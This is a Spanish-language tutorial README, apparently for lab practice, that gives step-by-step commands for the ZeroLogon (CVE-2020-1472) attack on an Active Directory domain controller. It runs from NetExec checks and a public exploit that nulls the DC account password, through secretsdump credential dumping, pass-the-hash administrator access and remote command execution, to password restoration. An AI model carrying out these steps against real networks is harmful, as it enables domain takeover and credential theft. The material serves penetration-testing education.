# 📌 Ataque ZeroLogon (CVE-2020-1472)

Este repositorio documenta paso a paso cómo ejecutar el ataque **ZeroLogon** utilizando `NetExec` (antes CrackMapExec), el exploit de [VoidSec](https://github.com/VoidSec/CVE-2020-1472) y herramientas de Impacket.

---

## ⚠️ Importante

> Esta guía es solo para fines **educativos** y debe usarse únicamente en laboratorios controlados con permiso explícito. **NO** ejecutes este procedimiento en redes productivas.

---

## ⚙️ Requisitos

- Controlador de dominio sin parches para CVE-2020-1472.
- Máquina atacante con:
  - Linux o WSL.
  - Python 3.
  - NetExec (`nxc`), Impacket y Git instalados.

---

## 🧭 Paso a paso del ataque

### 1. Verificar conectividad SMB con el DC

```bash
nxc smb [IP_DEL_DC]
```

Repetir si es necesario para confirmar acceso:

```bash
nxc smb [IP_DEL_DC]
```

---

### 2. Explotar ZeroLogon con NetExec

```bash
nxc smb [IP_DEL_DC] -u '' -p '' -M zerologon
```

Este módulo intenta autenticar usando claves nulas y explotar la vulnerabilidad en Netlogon.
CHECKEAR esto y si es vulnerable.... lo siguiente

---

### 3. Clonar el exploit de VoidSec

Clonar repositorio
```bash
git clone https://github.com/VoidSec/CVE-2020-1472
cd CVE-2020-1472
```

Verificar si no debemos instalar algun requisito

```bash
pip install -r requirements.txt
```

---

### 4. Cambiar la contraseña de la cuenta de equipo del DC
```bash
python3 cve-2020-1472-exploit.py
```

O usar argumentos manuales:

```bash
python3 cve-2020-1472-exploit.py -t [IP_DEL_DC] -n [NOMBRE_DEL_DC]
```

---

### 5. Volcar hashes con Impacket

```bash
impacket-secretsdump '[[NOMBRE_DEL_DOMINIO]]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
```

Esto permite obtener los secretos de LSA y hash de administrador.

---

### 6. Validar acceso como máquina y luego como administrador 

```bash
nxc smb [IP_DEL_DC] -u '[NOMBRE_DEL_DC]$' -p '' --lsa
```
Usamos el <pre>--lsa</pre> para dumpear HEX de maquina para recuperar contraseña

Con hash de administrador (por ejemplo):

```bash
nxc smb [IP_DEL_DC] -u '[USUARIO_ADMINISTRADOR]' -H '[HASH_DE_ADMINISTRADOR]' --lsa
```

---

### 7. Restaurar la contraseña original del DC (opcional)

```bash
python3 reinstall_original_pw.py
```

O con argumentos:

```bash
python3 reinstall_original_pw.py [NOMBRE_DEL_DC]$ [IP_DEL_DC] [HEX_DE_CONTRASEÑA_DEL_DC]
```

---

### 8. Validar acceso final con hash NTLM

```bash
impacket-secretsdump '[[NOMBRE_DEL_DOMINIO]]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
```

---

### 9. Ejecutar comando remoto como administrador

```bash
nxc smb [IP_DEL_DC] -u 'administrator' -H '[HASH_DE_ADMINISTRADOR]' -x whoami
```

---

## 🧪 ¿Qué hicimos?

- Usamos `nxc` para aprovechar la vulnerabilidad en Netlogon.
- Reemplazamos la contraseña de la cuenta del DC con una contraseña nula.
- Extraímos hashes y secretos del sistema.
- Accedimos remotamente como administrador de dominio.
- Finalmente restauramos el estado original.

---

## 📚 Referencias

- [ZeroLogon CVE-2020-1472 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
- [VoidSec CVE-2020-1472 Exploit](https://github.com/VoidSec/CVE-2020-1472)
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec)
- [Impacket](https://github.com/SecureAuthCorp/impacket)

------

## 🚨 Advertencia

### Riesgo crítico: el AD puede romperse
El exploit ZeroLogon cambia la contraseña de la cuenta de máquina del controlador de dominio. Si no se restaura rápidamente, el controlador ya no podrá autenticarse ni replicarse con otros DCs.

**Esto puede:**
- Romper la replicación del Active Directory.
- Causar fallos en políticas, usuarios y servicios.
- Obligar a restaurar el dominio desde backups.

### 🛑 Siempre restaurá la contraseña original del DC antes de que se sincronice con otros controladores.

---

## 👤 Autor

Explicación elaborada por [Sebastian Peinador](https://www.linkedin.com/in/sebastian-j-peinador/) para propósitos didácticos y de investigación en ciberseguridad ofensiva.
